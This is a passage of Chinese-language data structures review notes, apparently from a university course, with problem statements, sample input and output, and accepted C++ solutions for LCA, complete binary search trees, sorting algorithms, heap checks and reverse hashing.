found.\" << endl;\n\t\treturn;\n\t}\n\telse if (a == -1)\n\t{\n\t\tcout << \"ERROR: \" << x << \" is not found.\" << endl;\n\t\treturn;\n\t}\n\telse if (b == -1)\n\t{\n\t\tcout << \"ERROR: \" << y << \" is not found.\" << endl;\n\t\treturn;\n\t}\n\n\tint ta = a, tb = b;\n\twhile (BIT[ta].depth != BIT[tb].depth)\n\t{\n\t\tif (BIT[ta].depth > BIT[tb].depth)\n\t\t{\n\t\t\tta = BIT[ta].fa;\n\t\t}\n\t\telse\n\t\t{\n\t\t\ttb = BIT[tb].fa;\n\t\t}\n\t}\n\twhile (ta != tb)\n\t{\n\t\tta = BIT[ta].fa;\n\t\ttb = BIT[tb].fa;\n\t}\n\tint LCA = ta;\n\tint LCAval = BIT[ta].value;\n\tif (LCA == a)cout << x << \" is an ancestor of \" << y << \".\" << endl;\n\telse if (LCA == b)cout << y << \" is an ancestor of \" << x << \".\" << endl;\n\telse cout << \"LCA of \" << x << \" and \" << y << \" is \" << LCAval << \".\" << endl;\n}\n\nint main()\n{\n\tint n, m;\n\tcin >> m >> n;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tint x;\n\t\tcin >> x;\n\t\tinsert(x, 0, 0, 0, 0);\n\t}\n\n\twhile (m--)\n\t{\n\t\tint x, y;\n\t\tcin >> x >> y;\n\t\tint a = query(x, 0), b = query(y, 0);\n\t\tfindLCA(a, b, x, y);\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 完全二叉搜索树\n\n题目:\n\n```\n一个无重复的非负整数序列，必定对应唯一的一棵形状为完全二叉树的二叉搜索树。本题就要求你输出这棵树的层序遍历序列。\n\n输入\n首先第一行给出一个正整数 N（≤1000），随后第二行给出 N 个不重复的非负整数。数字间以空格分隔，所有数字不超过 2000。\n\n输出\n在一行中输出这棵树的层序遍历序列。数字间以 1 个空格分隔，行首尾不得有多余空格。\n```\n\n样例：\n\n```\n10\n1 2 3 4 5 6 7 8 9 0\n```\n\n样例输出：\n\n```\n6 3 8 1 5 7 9 0 2 4\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<algorithm>\n#include<queue>\nusing namespace std;\n\nint tree[1005];\nint num[1005];\nint index = 1;\n\nvoid buildtree(int pos, int n)\n{\n\tif (pos > n)return;\n\tbuildtree(pos << 1, n);\n\ttree[pos] = num[index++];\n\tbuildtree(pos << 1 | 1, n);\n}\n\nvoid levelorder(int n)\n{\n\tfor (int i = 1; i <= n; i++)cout << tree[i] << ' ';\n\n}\n\nint main()\n{\n\tint n;\n\tcin >> n;\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tcin >> num[i];\n\t}\n\tsort(num + 1, num + 1 + n);\n\tbuildtree(1, n);\n\tlevelorder(n);\n\treturn 0;\n}\n```\n\n\n\n\n\n## 排序\n\n* 内部排序与外部排序的区别：\n\n  内部排序：在排序期间数据对象全部存放在内存的排序；\n\n  外部排序：在排序期间全部对象个数太多，不能同时存放在内存，必须根据排序过程的要求，不断在内、外存之间移动的排序。\n\n\n\n* 排序方法的稳定性判断：\n\n  如果在记录序列中有两个记录r[i]和r[j], 它们的关键字 key[i] == key[j] , 且在排序之前, 记录r[i]排在r[j]前面。\n\n  如果在排序之后, 记录r[i]仍在记录r[j]的前面, 则称这个排序方法是稳定的。\n\n  否则称这个排序方法是不稳定的。\n\n#### DS内排—直插排序\n\n##### 直插排序算法分析\n\n* 在平均情况下的关键字比较次数和记录移动次数约为 $n^2/4$。\n\n* 直接插入排序的时间复杂度为$O(n^2)$\n\n* 直接插入排序是一种**稳定的排序方法**\n\n* 直接插入排序最大的优点是简单，在记录数较少时，是比较好的办法\n\n* 直接插入排序空间复杂度：$O(1)$\n\n* 直接插入排序的时间复杂度与初始数据有关\n\n* 直接插入排序最坏完成所有排序后，找到最大或最小。\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201153148809.png\" alt=\"image-20230201153148809\" style=\"zoom:50%;\" />\n\n题目:\n\n```\n给定一组数据，使用直插排序完成数据的升序排序。\n\n--程序要求--\n若使用C++只能include一个头文件iostream；若使用C语言只能include一个头文件stdio\n程序中若include多过一个头文件，不看代码，作0分处理\n不允许使用第三方对象或函数实现本题的要求\n\n输入\n数据个数n，n个数据\n\n输出\n直插排序的每一趟排序结果\n```\n\n样例：\n\n```\n7 34 23 677 2 1 453 3\n```\n\n样例输出：\n\n```\n23 34 677 2 1 453 3\n23 34 677 2 1 453 3\n2 23 34 677 1 453 3\n1 2 23 34 677 453 3\n1 2 23 34 453 677 3\n1 2 3 23 34 453 677\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nvoid insertSort(int num[], int n)\n{\n\tint i, j;\n\tfor (int i = 1; i < n; i++)\n\t{\n\t\tint tmp = num[i];\n\t\tfor (j = i - 1; j >= 0 &&num[j] >= tmp ; j--)\n\t\t{\n\t\t\tnum[j + 1] = num[j];\n\t\t}\n\t\tnum[j + 1] = tmp;\n\n\t\tfor (int j = 0; j < n; j++)\n\t\t{\n\t\t\tcout << num[j];\n\t\t\tif (j == n - 1)cout << endl;\n\t\t\telse cout << ' ';\n\t\t}\n\t}\n}\n\nint main()\n{\n\tint n;\n\tint num[1000];\n\tcin >> n;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcin >> num[i];\n\t}\n\tinsertSort(num, n);\n\treturn 0;\n}\n```\n\n\n\n#### DS排序--**希尔排序**\n\n* 希尔排序方法是先将待排序列分成若干子序列分别进行插入排序，待整个序列基本有序时，再对全体记录进行一次直接插入排序\n\n##### 希尔排序算法描述\n\n```\n首先取一个整数 gap < n(待排序记录数) 作为间隔, 将全部记录分为 gap 个子序列, 所有距离为 gap 的记录放在同一个子序列中\n在每一个子序列中分别施行直接插入排序。\n然后缩小间隔 gap, 例如取 gap = gap/2\n重复上述的子序列划分和排序工作，直到最后取gap = 1, 将所有记录放在同一个序列中排序为止。\n```\n\n##### 希尔排序算法分析\n\n* 对特定的待排序记录序列，可以准确地估算关键字的比较次数和记录移动次数。\n\n* n在某个特定范围，希尔排序所需的比较次数和移动次数约为$n^{1.3}$\n\n* 当n趋于无穷时可减少到$n(log_2 n)^2$\n\n* 希尔排序的最坏情况时间复杂度与步长有关。\n\n* 希尔排序是一种**不稳定的排序方法**\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201153553883.png\" alt=\"image-20230201153553883\" style=\"zoom:50%;\" />\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201153639499.png\" alt=\"image-20230201153639499\" style=\"zoom:50%;\" />\n\n题目:\n\n```\n给出一个数据序列，使用希尔排序算法进行降序排序。\n间隔gap使用序列长度循环除2直到1\n\n输入\n第一行输入t，表示有t个测试示例\n第二行输入n，表示第一个示例有n个数据(n>1)\n第三行输入n个数据，都是正整数，数据之间用空格隔开\n以此类推\n\n输出\n对每组测试数据，输出每趟排序结果。不同组测试数据间用空行分隔。\n```\n\n样例：\n\n```\n2\n6\n111 22 6 444 333 55\n8\n77 555 33 1 444 77 666 2222\n```\n\n样例输出：\n\n```\n444 333 55 111 22 6\n444 333 111 55 22 6\n\n444 555 666 2222 77 77 33 1\n666 2222 444 555 77 77 33 1\n2222 666 555 444 77 77 33 1\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nvoid ShellSort(int num[], int n)\n{\n\tint i, j;\n\tint tmp;\n\tfor (int gap = n / 2; gap >= 1; gap /= 2)\n\t{\n\t\tfor (j = gap; j < n; j++)\n\t\t{\n\t\t\ttmp = num[j];\n\t\t\tfor (i = j - gap; i >= 0; i -= gap)\n\t\t\t{\n\t\t\t\tif (num[i + gap] > num[i])\n\t\t\t\t{\n\t\t\t\t\tswap(num[i + gap], num[i]);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tfor (i = 0; i < n; i++)\n\t\t{\n\t\t\tcout << num[i];\n\t\t\tif (i == n - 1)cout << endl;\n\t\t\telse cout << ' ';\n\t\t}\n\t}\n}\n\nint main()\n{\n\tint t, n, num[1000];\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> n;\n\t\tfor (int i = 0; i < n; i++)cin >> num[i];\n\t\tShellSort(num, n);\n\t\tcout << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 冒泡排序\n\n* 起泡排序的时间复杂度为$O(n^2)$\n\n* **起泡排序是一种**稳定的排序方法\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201153801647.png\" alt=\"image-20230201153801647\" style=\"zoom:50%;\" />\n\n题目:\n\n```\n给定一个包含从0到n-1各一次的数组，若使用冒泡排序将其排为升序，问其中需要进行多少次交换\n\n输入\n测试数据有多组，\n每组由两行组成：第一行包含正整数n（n <= 5000）; 下一行包含从0到n-1的n个整数的序列。\n\n输出\n对于每组测试数据，\n输出交换次数\n```\n\n样例：\n\n```\n10\n1 3 6 9 0 8 5 7 4 2\n```\n\n样例输出：\n\n```\n22\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nint main()\n{\n\tint n;\n\tint num[5005];\n\twhile (cin >> n)\n\t{\n\t\tfor (int i = 0; i < n; i++)cin >> num[i];\n\n\t\tint cnt = 0;\n\t\tfor (int i = 0; i < n - 1; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < n - i - 1; j++)\n\t\t\t{\n\t\t\t\tif (num[j] > num[j + 1])swap(num[j], num[j + 1]), cnt++;\n\t\t\t}\n\t\t}\n\t\tcout << cnt << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS排序—快速排序\n\n##### 快排算法描述\n\n取序列第一个记录为枢轴记录，其关键字为Pivotkey\n\n指针low指向序列第一个记录位置\n\n指针high指向序列最后一个记录位置\n\n* 快排的一趟过程：\n\n  ```\n  1.从high指向的记录开始,向前找到第一个关键字的值小于Pivotkey的记录,将其放到low指向的位置,low+1\n  2.从low指向的记录开始,向后找到第一个关键字的值大于Pivotkey的记录,将其放到high指向的位置,high-1\n  3.重复1,2，直到low=high，将枢轴记录放在low(high)指向的位置\n  ```\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201153930553.png\" alt=\"image-20230201153930553\" style=\"zoom:50%;\" />\n\n  下一步：分别对21两侧进行同样的操作\n\n\n\n##### 快排性能分析\n\n* 可以证明, 快速排序的平均计算时间也是$O(nlog_2n)$。\n\n* 实验结果表明: 就平均计算时间而言, 快速排序是所有内排序方法中最好的一个。\n\n* 快速排序是一种**不稳定的排序方法**\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201154216791.png\" alt=\"image-20230201154216791\" style=\"zoom:50%;\" />\n\n快排的改进：枢轴记录取low、high、(low+high)/2三者指向记录关键字居中的记录\n\n\n\n题目:\n\n```\n输入一组数据，用快速排序进行升序排序。\n\n输入\n测试次数t\n每组测试数据为：\n数据个数n，n个数字\n\n输出\n对每组测试数据，输出快速排序每趟排好的数字及位置（位置从1开始）。不同组测试数据的输出以空行分隔。\n```\n\n样例：\n\n```\n2\n6 111 22 6 444 333 55\n8 77 555 33 1 444 77 10 200\n```\n\n样例输出：\n\n```\n111 4\n55 3\n6 1\n22 2\n333 5\n444 6\n\n77 4\n10 2\n1 1\n33 3\n444 7\n200 6\n77 5\n555 8\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nint num[1000];\n\nvoid quicksort(int a, int b)\n{\n\tif (a > b)return;\n\tint l = a, r = b;\n\tint p = num[l];\n\tint blank = l;\n\twhile (l < r)\n\t{\n\t\twhile (num[r] >= p && r > blank)r--;\n\t\tif (l == r)break;\n\t\tnum[l] = num[r], l++, blank = r;\n\t\twhile (num[l] <= p && l < blank)l++;\n\t\tif (l == r)break;\n\t\tnum[r] = num[l], blank = l;\n\t}\n\tnum[l] = p;\n\tcout << p << ' ' << l + 1 << endl;\n\tif (a == b)return;\n\tquicksort(a, l - 1);\n\tquicksort(l + 1, b);\n\n}\n\nint main()\n{\n\tint t, n;\n\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> n;\n\t\tfor (int i = 0; i < n; i++)cin >> num[i];\n\t\tquicksort(0, n - 1);\n\t\tcout << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS内排—堆排序\n\n##### 大顶堆建堆实例\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201154412662.png\" alt=\"image-20230201154412662\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201154425113.png\" alt=\"image-20230201154425113\" style=\"zoom:50%;\" />\n\n从初始序列最后一个不是叶子结点的节点开始往前进行筛选\n\n小顶堆的建堆与此类似，只是比较规则不同\n\n\n\n堆排序：从后往前，每次将堆顶和最后一个元素交换，然后对前面的元素进行筛选维护一个新堆，不断重复这个过程\n\n* 升序，建立大顶堆\n\n* 降序，建立小顶堆\n\n\n\n##### 堆排序性能分析\n\n* 对长度为n的序列，排序最多需要做n-1次调整建新堆(筛选)\n\n* 因此共需要$O(nk)$量级的时间\n\n* 堆排序时间复杂度为$O(nlog_2n)$\n\n* 堆排序是一个**不稳定的排序方法**\n\n记录数较多时，推荐堆排序\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201155017529.png\" alt=\"image-20230201155017529\" style=\"zoom:50%;\" />\n\n\n\n题目:\n\n```\n给定一组数据，使用堆排序完成数据的降序排序。（建小顶堆)。\n\n输入\n数据个数n，n个整数数据\n\n输出\n初始创建的小顶堆序列\n每趟交换、筛选后的数据序列，输出格式见样例\n```\n\n样例：\n\n```\n8 34 23 677 2 1 453 3 7\n```\n\n样例输出：\n\n```\n8 1 2 3 7 23 453 677 34\n8 2 7 3 34 23 453 677 1\n8 3 7 453 34 23 677 2 1\n8 7 23 453 34 677 3 2 1\n8 23 34 453 677 7 3 2 1\n8 34 677 453 23 7 3 2 1\n8 453 677 34 23 7 3 2 1\n8 677 453 34 23 7 3 2 1\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nint num[1000];\nconst int INF = 0x3f3f3f3f;\n\nvoid heap(int pos, int n)\n{\n\tint minn = num[pos];\n\tint ls = pos << 1, rs = pos << 1 | 1;\n\tint vl, vr;\n\tif (ls > n)vl = INF;\n\telse vl = num[ls];\n\tif (rs > n)vr = INF;\n\telse vr = num[rs];\n\n\tminn = min(minn, vl);\n\tminn = min(minn, vr);\n\tif (minn == num[pos])return;\n\telse if (minn == vl)\n\t{\n\t\tswap(num[pos], num[ls]);\n\t\theap(ls, n);\n\t}\n\telse if(minn == vr)\n\t{\n\t\tswap(num[pos], num[rs]);\n\t\theap(rs, n);\n\t}\n}//维护堆操作\n\nvoid createheap(int n)\n{\n\tfor (int i = n / 2; i >= 0; i--)\n\t{\n\t\theap(i, n);\n\t}\n}\n\nvoid print(int n)\n{\n\tcout << n << ' ';\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tcout << num[i];\n\t\tif (i == n)cout << endl;\n\t\telse cout << ' ';\n\t}\n}\n\nvoid heapsort(int n)\n{\n\tfor (int i = n; i > 1; i--)\n\t{\n\t\tswap(num[1], num[i]);\n\t\theap(1, i - 1);\n\t\tprint(n);\n\t}\n}\n\nint main()\n{\n\tint n;\n\tcin >> n;\n\tfor (int i = 1; i <= n; i++)cin >> num[i];\n\tcreateheap(n);\n\tprint(n);\n\theapsort(n);\n\treturn 0;\n}\n```\n\n\n\n#### 关于堆的判断\n\n题目:\n\n```\n将一系列给定数字顺序插入一个初始为空的小顶堆H[]。随后判断一系列相关命题是否为真。命题分下列几种：\n\nx is the root：x是根结点；\nx and y are siblings：x和y是兄弟结点；\nx is the parent of y：x是y的父结点；\nx is a child of y：x是y的一个子结点。\n\n输入\n每组测试第1行包含2个正整数N（≤ 1000）和M（≤ 20），分别是插入元素的个数、以及需要判断的命题数。下一行给出区间[−10000,10000]内的N个要被插入一个初始为空的小顶堆的整数。之后M行，每行给出一个命题。题目保证命题中的结点键值都是存在的。\n\n输出\n对输入的每个命题，如果其为真，则在一行中输出T，否则输出F。\n```\n\n样例：\n\n```\n5 4\n46 23 26 24 10\n24 is the root\n26 and 23 are siblings\n46 is the parent of 23\n23 is a child of 10\n```\n\n样例输出：\n\n```\nF\nT\nF\nT\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<string>\nusing namespace std;\n\nint num[1000];\nconst int INF = 0x3f3f3f3f;\n\nvoid heap(int pos, int n)\n{\n\tint minn = num[pos];\n\tint ls = pos << 1, rs = pos << 1 | 1;\n\tint vl, vr;\n\tif (ls > n)vl = INF;\n\telse vl = num[ls];\n\tif (rs > n)vr = INF;\n\telse vr = num[rs];\n\n\tminn = min(minn, vl);\n\tminn = min(minn, vr);\n\tif (minn == num[pos])return;\n\telse if (minn == vl)\n\t{\n\t\tswap(num[pos], num[ls]);\n\t\theap(ls, n);\n\t}\n\telse if (minn == vr)\n\t{\n\t\tswap(num[pos], num[rs]);\n\t\theap(rs, n);\n\t}\n}\n\nvoid createheap(int n)\n{\n\tfor (int i = n / 2; i >= 0; i--)\n\t{\n\t\theap(i, n);\n\t}\n}\n\n\nint main()\n{\n\tint n, m;\n\tcin >> n >> m;\n\tfor (int i = 1; i <= n; i++)cin >> num[i];\n\tcreateheap(n);\n\n\twhile (m--)\n\t{\n\t\tstring str;\n\t\twhile(str==\"\")getline(cin, str);\n\t\tstring num1 = \"\", num2 = \"\";\n\t\tbool flag = 0, lastdig = 0;\n\t\tint size = str.size();\n\t\tfor (int i = 0; i < size; i++)\n\t\t{\n\t\t\tif (!flag && str[i] >= '0' && str[i] <= '9')num1 += str[i], lastdig = 1;\n\t\t\telse if (flag && str[i] >= '0' && str[i] <= '9')num2 += str[i], lastdig = 1;\n\t\t\tif (lastdig && str[i] == ' ')flag = 1, lastdig = 0;\n\t\t}\n\n\t\tbool istrue = 0;\n\t\tint a, b;\n\t\tif (num1.size() > 0)a = stoi(num1);\n\t\tif (num2.size() > 0)b = stoi(num2);\n\t\tif (str.find(\"root\") != -1)\n\t\t{\n\t\t\tif (num[1] == a)istrue = 1;\n\t\t}\n\t\telse if (str.find(\"siblings\") != -1)\n\t\t{\n\t\t\tint index1, index2;\n\t\t\tfor (int i = 1; i <= n; i++)\n\t\t\t{\n\t\t\t\tif (num[i] == a)index1 = i;\n\t\t\t\tif (num[i] == b)index2 = i;\n\t\t\t}\n\t\t\tif (index1 / 2 == index2 / 2)istrue = 1;\n\t\t}\n\t\telse if (str.find(\"parent\") != -1)\n\t\t{\n\t\t\tint index1, index2;\n\t\t\tfor (int i = 1; i <= n; i++)\n\t\t\t{\n\t\t\t\tif (num[i] == a)index1 = i;\n\t\t\t\tif (num[i] == b)index2 = i;\n\t\t\t}\n\t\t\tif (index1 == index2 / 2)istrue = 1;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tint index1, index2;\n\t\t\tfor (int i = 1; i <= n; i++)\n\t\t\t{\n\t\t\t\tif (num[i] == a)index1 = i;\n\t\t\t\tif (num[i] == b)index2 = i;\n\t\t\t}\n\t\t\tif (index2 == index1 / 2)istrue = 1;\n\t\t}\n\n\t\tif (istrue)cout << \"T\" << endl;\n\t\telse cout << \"F\" << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 逆散列问题*\n\n题目:\n\n```\n给定长度为 N 的散列表，处理整数最常用的散列映射是 H(x)=x%N。如果我们决定用线性探测解决冲突问题，则给定一个顺序输入的整数序列后，我们可以很容易得到这些整数在散列表中的分布。例如我们将 1、2、3 顺序插入长度为 3 的散列表HT[]后，将得到HT[0]=3，HT[1]=1，HT[2]=2的结果。\n\n但是现在要求解决的是“逆散列问题”，即给定整数在散列表中的分布，问这些整数是按什么顺序插入的？\n\n输入\n输入的第一行是正整数 N（≤1000），为散列表的长度。第二行给出了 N 个整数，其间用空格分隔，每个整数在序列中的位置（第一个数位置为0）即是其在散列表中的位置，其中负数表示表中该位置没有元素。题目保证表中的非负整数是各不相同的。\n\n输出\n按照插入的顺序输出这些整数，其间用空格分隔，行首尾不能有多余的空格。注意：对应同一种分布结果，插入顺序有可能不唯一。例如按照顺序 3、2、1 插入长度为 3 的散列表，我们会得到跟 1、2、3 顺序插入一样的结果。在此规定：当前的插入有多种选择时，必须选择最小的数字，这样就保证了最终输出结果的唯一性。\n```\n\n样例：\n\n```\n11\n33 1 13 12 34 38 27 22 32 -1 21\n```\n\n样例输出：\n\n```\n1 13 12 21 33 34 38 27 22 32\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<algorithm>\nusing namespace std;\n\n#define maxn 1000\n\nint n, cnt = 0;\nint HT[maxn], num[maxn], ans[maxn];\nbool visHT[maxn], visnum[maxn];\n\nvoid HashReverse()\n{\n\tfor (int i = 0; i < cnt; i++)\n\t{\n\t\tfor (int j = 0; j < cnt; j++)\n\t\t{\n\t\t\tif(visnum[j])continue;\n\t\t\tbool find = 0;\n\t\t\tfor (int k = num[j] % n;; k = (k + 1) % n)\n\t\t\t{\n\t\t\t\tif (!visHT[k] && HT[k] == num[j])\n\t\t\t\t{\n\t\t\t\t\tans[i] = num[j];\n\t\t\t\t\tvisnum[j] = visHT[k] = 1;\n\t\t\t\t\tfind = 1;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tif (!visHT[k])break; //这个位置已经填入数\n\t\t\t}\n\t\t\tif (find)break;\n\t\t}\n\t}\n\n\tfor (int i = 0; i < cnt; i++)\n\t{\n\t\tcout << ans[i];\n\t\tif (i == n - 1)cout << endl;\n\t\telse cout << ' ';\n\t}\n}\n\nint main()\n{\n\tcin >> n;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcin >> HT[i]; \n\t\tif (HT[i] != -1)num[cnt++] = HT[i];\n\t}\n\tsort(num, num + cnt);\n\tHashReverse();\n\treturn 0;\n}\n```\n\n\n\n#### DS内排—2-路归并排序\n\n##### 2路归并举例\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202103625596.png\" alt=\"image-20230202103625596\" style=\"zoom:50%;\" />\n\n##### 性能分析\n\n* 假设待归两个有序表长度分别为m和n，则两路归并后，新的有序表长度为m+n\n\n* 两路归并操作至多只需要m+n次移位和m+n次比较\n\n* 因此两路归并的时间复杂度为O(m+n)\n\n* 如果待排序的记录为n个，则需要做$log_2n$趟两路归并排序\n\n* 每趟两路归并排序的时间复杂度为O(n)\n\n* 因此2路－归并排序的时间复杂度为$O(nlog_2n)$\n\n* 归并排序是一种**稳定的排序方法**\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202103758385.png\" alt=\"image-20230202103758385\" style=\"zoom:50%;\" />\n\n\n\n题目:\n\n```\n输入一组字符串，用2-路归并排序按字典顺序进行降序排序。\n\n输入\n测试次数t\n每组测试数据：数据个数n，后跟n个字符串，字符串不含空格。\n\n输出\n对每组测试数据，输出2-路归并排序的每一趟排序结果。每组测试数据的输出之间有1空行。\n```\n\n样例：\n\n```\n2\n6 shenzhen beijing guangzhou futian nanshan baoan\n10 apple pear peach grape cherry dew fig haw lemon marc\n```\n\n样例输出：\n\n```\nshenzhen beijing guangzhou futian nanshan baoan\nshenzhen guangzhou futian beijing nanshan baoan\nshenzhen nanshan guangzhou futian beijing baoan\n\npear apple peach grape dew cherry haw fig marc lemon\npear peach grape apple haw fig dew cherry marc lemon\npear peach haw grape fig dew cherry apple marc lemon\npear peach marc lemon haw grape fig dew cherry apple\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<algorithm>\nusing namespace std;\n\n#define maxn 1000\n\nint t, n;\nstring str[maxn];\nstring tmp[maxn];\n\nvoid merge(string InitList[], string mergedList[],int l, int mid, int r) \n{\n\tint i = l, j = mid, k = l;\n\twhile (i < mid && j < r)\n\t{\n\t\tif (InitList[i] >= InitList[j])\n\t\t{\n\t\t\tmergedList[k] = InitList[i]; i++;  k++;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tmergedList[k] = InitList[j]; j++;  k++; \n\t\t}\n\t}\n\twhile (i < mid) \n\t{\n\t\tmergedList[k] = InitList[i]; \n\t\ti++, k++; \n\t}\n\twhile (j < r) \n\t{\n\t\tmergedList[k] = InitList[j]; \n\t\tj++, k++; \n\t}\n}\n\n\nvoid print()\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcout << str[i];\n\t\tif (i == n - 1)cout << endl;\n\t\telse cout << ' ';\n\t}\n}\n\nvoid mergeSort()\n{\n\tfor (int i = 2; i <=2 *  n; i *= 2)\n\t{\n\t\tfor (int st = 0; st < n; st += i)\n\t\t{\n\t\t\tint mid = st + i / 2;\n\t\t\tfor (int j = 0; j < n; j++)tmp[j] = str[j];\n\t\t\tmerge(tmp, str, st, mid, min(st + i,n));\n\t\t}\n\t\tprint();\n\t}\n}\n\n\nint main()\n{\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> n;\n\t\tfor (int i = 0; i < n; i++)cin >> str[i];\n\t\tmergeSort();\n\t\tcout << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 基数排序（内部排序）\n\n##### 最低位优先法（LSD）\n\n从最低位关键字kd起进行排序，然后再对高一位的关键字排序，……依次重复，直至对最高位关键字k1排序后，成为一个有序序列\n\n\n\n##### 链式基数排序\n\n基数排序：借助“分配”和“收集”对单逻辑关键字进行排序的一种方法\n\n链式基数排序方法：用链表作存储结构的基数排序\n\n设置10个队列，f[i]和e[i]分别为第i个队列的头指针和尾指针（十个数字对应十个队列）\n\n\n\n* 分配：第i趟按顺序将数字分配到第i位对应的数字的链队列中\n* 收集：将数字对应为0-9的队列中的元素按次序连起来形成一个新的序列\n\n从最低位至最高位，逐位执行上述两步操作，最后得到一个有序序列。\n\n例子：\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202104302917.png\" alt=\"image-20230202104302917\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202104321304.png\" alt=\"image-20230202104321304\" style=\"zoom:50%;\" />\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202104336592.png\" alt=\"image-20230202104336592\" style=\"zoom:50%;\" />\n\n\n\n##### 性能分析\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230202104406943.png\" alt=\"image-20230202104406943\" style=\"zoom:50%;\" />\n\n\n\n题目:\n\n```\n给定一组数据，对其进行基数升序排序。\n\n输入\n测试次数t\n每组测试数据一行：数字个数n，后跟n个数字（整数）\n注：如果序列中有负数，则每个数字加上最小负数的绝对值，使序列中的数均大于等于0。排序后再减去最小负数的绝对值。\n\n输出\n对每组测试数据，输出每趟分配、收集的结果。若分配中该位没有数字，输出NULL。具体输出格式见样例。每组测试数据间以空行分隔。\n如果序列中有负数，最后输出减去最小负数绝对值的序列值。\n```\n\n样例：\n\n```\n2\n10 278 109 63 930 589 184 505 269 8 83\n6 57 0 93 19 18 99\n```\n\n样例输出：\n\n```\n0:->930->^\n1:NULL\n2:NULL\n3:->63->83->^\n4:->184->^\n5:->505->^\n6:NULL\n7:NULL\n8:->278->8->^\n9:->109->589->269->^\n930 63 83 184 505 278 8 109 589 269\n0:->505->8->109->^\n1:NULL\n2:NULL\n3:->930->^\n4:NULL\n5:NULL\n6:->63->269->^\n7:->278->^\n8:->83->184->589->^\n9:NULL\n505 8 109 930 63 269 278 83 184 589\n0:->8->63->83->^\n1:->109->184->^\n2:->269->278->^\n3:NULL\n4:NULL\n5:->505->589->^\n6:NULL\n7:NULL\n8:NULL\n9:->930->^\n8 63 83 109 184 269 278 505 589 930\n\n0:->0->^\n1:NULL\n2:NULL\n3:->93->^\n4:NULL\n5:NULL\n6:NULL\n7:->57->^\n8:->18->^\n9:->19->99->^\n0 93 57 18 19 99\n0:->0->^\n1:->18->19->^\n2:NULL\n3:NULL\n4:NULL\n5:->57->^\n6:NULL\n7:NULL\n8:NULL\n9:->93->99->^\n0 18 19 57 93 99\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<vector>\nusing namespace std;\n\nint t, n;\nint maxdig;\nint num[1000];\n\nvoid print()\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcout << num[i];\n\t\tif (i == n - 1)cout << endl;\n\t\telse cout << ' ';\n\t}\n}\n\nvoid baseSort()\n{\n\tvector<int> base[10];\n\tfor (int i = 0; i < maxdig; i++)\n\t{\n\t\tfor (int j = 0; j < 10; j++)base[j].clear();\n\n\t\tfor (int j = 0; j < n; j++)\n\t\t{\n\t\t\tint tmp;\n\t\t\tif (i == 0)tmp = num[j] % 10;\n\t\t\telse\n\t\t\t{\n\t\t\t\ttmp = num[j];\n\t\t\t\tfor (int p = 0; p < i; p++)tmp /= 10;\n\t\t\t\ttmp %= 10;\n\t\t\t}\n\t\t\tbase[tmp].push_back(num[j]);\n\t\t}\n\n\t\tint cnt = 0;\n\t\tfor (int j = 0; j < 10; j++)\n\t\t{\n\t\t\tif (base[j].empty())cout << j << \":NULL\" << endl;\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << j << \":\";\n\t\t\t\tfor (auto k : base[j])\n\t\t\t\t{\n\t\t\t\t\tnum[cnt++] = k;\n\t\t\t\t\tcout << \"->\" << k;\n\t\t\t\t}\n\t\t\t\tcout << \"->^\" << endl;\n\t\t\t}\n\t\t}\n\n\t\tprint();\n\t}\n}\n\nint main()\n{\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> n;\n\t\tint maxnum = 0;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tcin >> num[i];\n\t\t\tmaxnum = max(maxnum, num[i]);\n\t\t}\n\t\tmaxdig = 0;\n\t\twhile (maxnum)\n\t\t{\n\t\t\tmaxnum /= 